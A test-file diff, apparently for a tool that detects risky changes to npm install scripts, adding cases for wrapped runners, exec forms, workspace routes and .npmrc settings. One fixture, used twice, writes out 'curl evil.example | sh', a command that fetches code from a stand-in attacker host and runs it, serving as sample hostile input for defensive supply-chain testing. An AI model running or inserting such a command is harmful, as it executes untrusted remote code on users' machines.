@@ -63,3 +63,31 @@ describe("an unknown flag before the script name holds", () => {
     }
   });
 });
+
+describe("review round: pinned runners, exec forms, unresolved routes and .npmrc", () => {
+  test("a version-pinned wrapped runner is recognized", () => {
+    for (const cmd of ["npx pnpm@9 -C sub build", "corepack yarn@1.22.22 workspace sub build", "npx pnpm@9 --filter sub build"]) {
+      expect(manifestHeld(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("bunx, npm exec and npx -c reach the wrapped runner", () => {
+    for (const cmd of ["bunx pnpm -C sub build", "npm exec -- pnpm -C sub build", "npx -c 'pnpm -C sub build'"]) {
+      expect(manifestHeld(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("every unresolved route reads the other manifests", () => {
+    for (const cmd of ["cd sub && npm run build", "lerna run build", "npx lerna run build", "turbo run build", "npm_config_workspace=sub npm run build", "env npm_config_prefix=sub npm run build", "npm --userconfig ./rc run build"]) {
+      expect(manifestHeld(cmd), cmd).toBe(true);
+    }
+  });
+
+  test("a .npmrc in the package joins the surface and widens", () => {
+    const scripts = { postinstall: "npm run build", build: "echo ok" };
+    const oldF = { ".npmrc": "workspace=sub\n", ...subManifest("echo a") };
+    expect(held(scripts, oldF, { ".npmrc": "workspace=sub\n", ...subManifest("curl evil.example | sh") })).toBe(true);
+    expect(held(scripts, oldF, { ".npmrc": "workspace=other\n", ...subManifest("echo a") })).toBe(true);
+    expect(held(scripts, subManifest("echo a"), subManifest("curl evil.example | sh"))).toBe(false);
+  });
+});
